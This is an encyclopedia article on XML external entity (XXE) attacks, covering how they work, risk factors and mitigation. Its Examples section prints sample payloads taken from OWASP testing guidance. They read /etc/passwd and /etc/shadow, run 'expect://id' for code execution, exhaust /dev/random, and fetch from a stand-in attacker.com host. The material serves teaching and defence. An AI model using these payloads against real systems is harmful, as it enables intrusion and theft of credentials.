---
title: "XML external entity attack"
source: https://en.wikipedia.org/wiki/XML_external_entity_attack
domain: xxe-prevention
license: CC-BY-SA-4.0
tags: xml external entity, xxe prevention, xml parser hardening, document type definition
fetched: 2026-07-02
---

# XML external entity attack

**XML External Entity attack**, or simply **XXE attack**, is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, DoS attacks, server-side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.

## Description

The XML 1.0 standard defines the structure of an XML document. The standard defines a concept called an entity, which is a term that refers to multiple types of data unit. One of those types of entities is an external general/parameter parsed entity, often shortened to external entity, that can access local or remote content via a declared system identifier. The system identifier is assumed to be a URI that can be accessed by the XML processor when processing the entity. The XML processor then replaces occurrences of the named external entity with the contents that is referenced by the system identifier. If the system identifier contains tainted data and the XML processor dereferences this tainted data, the XML processor may disclose confidential information normally not accessible by the application. Similar attack vectors apply the usage of external DTDs, external style sheets, external schemas, etc. which, when included, allow similar external resource inclusion style attacks.

Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using `file://` schemes or relative paths in the system identifier. Since the attack occurs relative to the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via HTTP requests or launching a SSRF attack to any unprotected internal services. In some situations, an XML processor library that is vulnerable to client-side memory corruption issues may be exploited by dereferencing a malicious URI, possibly allowing arbitrary code execution under the application account. Other attacks can access local resources that may not stop returning data, possibly impacting application availability if too many threads or processes are not released.

The application does not need to explicitly return the response to the attacker for it to be vulnerable to information disclosures. An attacker can leverage DNS information to exfiltrate data through subdomain names to a DNS server under their control.

## Risk factors

- The application parses XML documents.
- Tainted data is allowed within the system identifier portion of the entity, within the document type definition (DTD).
- The XML processor is configured to validate and process the DTD.
- The XML processor is configured to resolve external entities within the DTD.

## Examples

The examples below are from OWASP's *Testing for XML Injection (WSTG-INPV-07)*.

### Accessing a local resource that may not return

```mw
 <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///dev/random" >]>
   <foo>&xxe;</foo>
```

### Remote code execution

When the PHP "expect" module is loaded, remote code execution may be possible with a modified payload.

```mw
 <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "expect://id" >]>
     <creds>
        <user>&xxe;</user>
        <pass>mypass</pass>
     </creds>
```

### Disclosing /etc/passwd or other targeted files

```mw
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
 
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
 
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
```

## Mitigation

Since the entire XML document is communicated from an untrusted client, it is not usually possible to selectively validate or escape tainted data within the system identifier in the DTD. The XML processor could be configured to use a local static DTD and disallow any declared DTD included in the XML document.
